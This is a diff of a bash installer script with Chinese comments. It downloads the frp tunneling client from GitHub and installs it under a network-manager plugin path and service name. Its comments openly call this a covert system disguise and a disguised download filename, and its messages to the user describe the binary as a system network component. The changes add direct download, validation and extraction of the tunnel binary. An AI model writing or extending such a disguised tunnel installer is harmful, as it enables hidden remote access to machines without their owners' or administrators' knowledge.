@@ -13,7 +13,7 @@ YELLOW="\033[0;33m"
 RED="\033[0;31m"
 NC="\033[0m" # 无颜色
 
-# 定义常量 - 更隐蔽的系统伪装
+# 定义常量 - 
 TOOL_VERSION=0.62.1
 INSTALL_DIR=/usr/share/network-manager/plugins
 SERVICE_NAME=nm-plugin-service
@@ -155,60 +155,104 @@ download_with_proxy() {
     
     return 0
 }
-# 修改下载函数，使用镜像地址自动下载
-download_with_mirrors() {
+
+# 直接从GitHub下载，并进行文件验证
+download_from_github() {
     echo -e "${BLUE}正在下载系统网络组件 ${TOOL_VERSION}...${NC}"
     cd /tmp
     
     # 伪装下载文件名
     DOWNLOAD_FILENAME="netmgr_${TOOL_VERSION}_linux.tar.gz"
     
-    # 定义多个镜像站点，按优先级排序
-    MIRROR_URLS=(
-        "https://ghproxy.com/https://github.com/fatedier/frp/releases/download/v${TOOL_VERSION}/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
-        "https://mirror.ghproxy.com/https://github.com/fatedier/frp/releases/download/v${TOOL_VERSION}/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
-        "https://gh.api.99988866.xyz/https://github.com/fatedier/frp/releases/download/v${TOOL_VERSION}/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
-        "https://download.fastgit.org/fatedier/frp/releases/download/v${TOOL_VERSION}/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
-        "https://hub.fgit.ml/fatedier/frp/releases/download/v${TOOL_VERSION}/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
-    )
+    # GitHub直接下载URL
+    GITHUB_URL="https://github.com/fatedier/frp/releases/download/v${TOOL_VERSION}/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
     
-    # 定义直接下载的备用URL
-    DIRECT_URL="https://github.com/fatedier/frp/releases/download/v${TOOL_VERSION}/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
+    echo -e "${YELLOW}开始从GitHub下载...${NC}"
     
-    echo -e "${YELLOW}开始自动下载，请稍候...${NC}"
-    
-    # 尝试从每个镜像下载，直到成功
-    for mirror_url in "${MIRROR_URLS[@]}"; do
-        echo -e "${BLUE}尝试从镜像站点下载...${NC}"
-        if curl -L -o "$DOWNLOAD_FILENAME" --connect-timeout 10 --max-time 60 "$mirror_url"; then
-            if [ -s "$DOWNLOAD_FILENAME" ]; then
-                echo -e "${GREEN}下载成功！${NC}"
+    # 使用curl下载，设置较长的超时时间
+    if curl -L -o "$DOWNLOAD_FILENAME" --connect-timeout 15 --max-time 300 "$GITHUB_URL"; then
+        if [ -s "$DOWNLOAD_FILENAME" ]; then
+            # 验证下载的文件是否为有效的tar.gz文件
+            if file "$DOWNLOAD_FILENAME" | grep -q "gzip compressed data"; then
+                echo -e "${GREEN}下载成功并验证为有效的压缩文件！${NC}"
                 return 0
             else
-                echo -e "${YELLOW}下载文件为空，尝试下一个镜像...${NC}"
+                echo -e "${RED}下载的文件不是有效的gzip文件！${NC}"
                 rm -f "$DOWNLOAD_FILENAME"
             fi
         else
-            echo -e "${YELLOW}镜像下载失败，尝试下一个镜像...${NC}"
-        fi
-    done
-    
-    # 如果所有镜像都失败，尝试直接下载
-    echo -e "${YELLOW}所有镜像下载失败，尝试直接下载...${NC}"
-    if curl -L -o "$DOWNLOAD_FILENAME" --connect-timeout 15 --max-time 90 "$DIRECT_URL"; then
-        if [ -s "$DOWNLOAD_FILENAME" ]; then
-            echo -e "${GREEN}直接下载成功！${NC}"
-            return 0
-        else
             echo -e "${RED}下载文件为空！${NC}"
+            rm -f "$DOWNLOAD_FILENAME"
         fi
     else
-        echo -e "${RED}直接下载也失败了！${NC}"
+        echo -e "${RED}下载失败！${NC}"
     fi
     
-    echo -e "${RED}所有下载方式均失败，请检查网络连接或手动下载。${NC}"
-    echo -e "${YELLOW}您可以手动下载文件并放置在 /tmp/${DOWNLOAD_FILENAME} 路径，然后重新运行此脚本。${NC}"
+    echo -e "${RED}GitHub下载失败，请检查网络连接或手动下载。${NC}"
+    echo -e "${YELLOW}手动下载链接: ${GITHUB_URL}${NC}"
+    echo -e "${YELLOW}下载后，请将文件重命名为 ${DOWNLOAD_FILENAME} 并放置在 /tmp 目录下，然后重新运行此脚本。${NC}"
+    
     return 1
+}
+
+# 解压并安装二进制文件
+extract_and_install() {
+    DOWNLOAD_FILENAME="netmgr_${TOOL_VERSION}_linux.tar.gz"
+    TEMP_DIR="netmgr_temp"
+    
+    echo -e "${BLUE}正在安装网络组件...${NC}"
+    mkdir -p "/tmp/$TEMP_DIR"
+    
+    # 验证文件是否为有效的tar.gz
+    if ! file "/tmp/$DOWNLOAD_FILENAME" | grep -q "gzip compressed data"; then
+        echo -e "${RED}文件格式错误：不是有效的gzip压缩文件！${NC}"
+        rm -rf "/tmp/$TEMP_DIR"
+        return 1
+    fi
+    
+    # 使用-z选项处理gzip文件
+    tar -zxf "/tmp/$DOWNLOAD_FILENAME" -C "/tmp/$TEMP_DIR" || {
+        echo -e "${RED}解压失败，可能下载的文件不完整或已损坏。${NC}"
+        rm -rf "/tmp/$TEMP_DIR"
+        return 1
+    }
+    
+    # 查找frpc文件，可能在不同的子目录中
+    FRPC_PATH=$(find "/tmp/$TEMP_DIR" -name "frpc" -type f | head -n 1)
+    
+    if [ -z "$FRPC_PATH" ]; then
+        echo -e "${RED}在解压后的文件中找不到frpc可执行文件！${NC}"
+        rm -rf "/tmp/$TEMP_DIR"
+        return 1
+    fi
+    
+    # 确保安装目录存在
+    mkdir -p "$INSTALL_DIR"
+    
+    # 复制frpc到目标位置
+    cp "$FRPC_PATH" "$INSTALL_DIR/$REAL_BINARY" || {
+        echo -e "${RED}复制文件失败。${NC}"
+        rm -rf "/tmp/$TEMP_DIR"
+        return 1
+    }
+    
+    # 确保可执行
+    chmod +x "$INSTALL_DIR/$REAL_BINARY"
+    
+    # 检查是否成功安装
+    if [ ! -f "$INSTALL_DIR/$REAL_BINARY" ] || [ ! -x "$INSTALL_DIR/$REAL_BINARY" ]; then
+        echo -e "${RED}安装失败：无法创建可执行文件！${NC}"
+        rm -rf "/tmp/$TEMP_DIR"
+        return 1
+    fi
+    
+    echo -e "${GREEN}✅ 网络组件安装成功！${NC}"
+    
+    # 清理临时文件
+    rm -f "/tmp/$DOWNLOAD_FILENAME"
+    rm -rf "/tmp/$TEMP_DIR"
+    
+    return 0
 }
 # 安装客户端
 install_client() {
@@ -237,7 +281,7 @@ install_client() {
     # 如果是新安装，则下载并安装
     if [ ! -f "$INSTALL_DIR/$REAL_BINARY" ]; then
         # 使用下载函数下载
-        if ! download_with_mirrors; then
+        if ! download_from_github; then
             echo -e "${RED}下载失败，请检查网络连接或代理设置。${NC}"
             return 1
         fi
